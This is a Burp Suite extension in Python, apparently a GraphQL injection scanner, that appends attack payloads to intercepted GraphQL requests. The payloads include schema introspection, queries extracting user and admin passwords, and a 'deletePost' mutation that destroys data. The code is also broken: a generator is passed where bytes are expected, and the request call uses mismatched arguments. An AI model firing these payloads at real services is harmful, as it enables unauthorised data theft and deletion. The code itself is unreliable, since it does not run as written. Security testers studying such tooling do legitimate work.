from burp import IBurpExtender, IHttpListener, IProxyListener, IScannerListener, ITab

class BurpExtender(IBurpExtender, IHttpListener, IScannerListener, ITab):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("GraphQL Injection | AmiRHbz")
        self._callbacks.registerHttpListener(self)
        self._callbacks.registerScannerListener(self)
        self._callbacks.addSuiteTab(self)
        
    def processHttpMessage(self, toolFlag, messageIsRequest, currentRequest):
        if messageIsRequest:
            request = currentRequest.getRequest()
            analyzedRequest = self._helpers.analyzeRequest(request)
            requestInfo = analyzedRequest.getUrl()
            if requestInfo.getPath().endswith("graphql"):
                query = self._helpers.bytesToString(request[analyzedRequest.getBodyOffset():])
                self._callbacks.makeHttpRequest(requestInfo.getHost(), requestInfo.getPort(), requestInfo.getProtocol(), request, self._helpers.stringToBytes(self.inject_payloads(query)), None)
    
    def inject_payloads(self, query):
        payloads = [
            "query {__schema {types {name}}}",
            "mutation {__schema {types {name}}}",
            "query {__type (name: \"Query\") {name, kind, fields {name, type {name}}}}",
            "query {__schema {queryType {name}}}",
            "query {__schema {mutationType {name}}}",
            "query {__type (name: \"Mutation\") {name, kind, fields {name, type {name}}}}",
            "query {__type (name: \"Subscription\") {name, kind, fields {name, type {name}}}}",
            "query {__schema {types {name, description}}}",
            "query {user (id: 1) {id, name, email, password}}",
            "mutation {deletePost (id: 1) {id}}",
            "query {posts (orderBy: {field: \"title\", direction: ASC}) {id, title, content}}",
            "query {users (filter: {email: {eq: \"admin@example.com\"}}) {id, name, email, password}}"
        ]
        for payload in payloads:
            yield query.replace("\n", "") + payload + "\n"
            
    def getTabCaption(self):
        return "GraphQL Injection"
    
    def getUiComponent(self):
        return None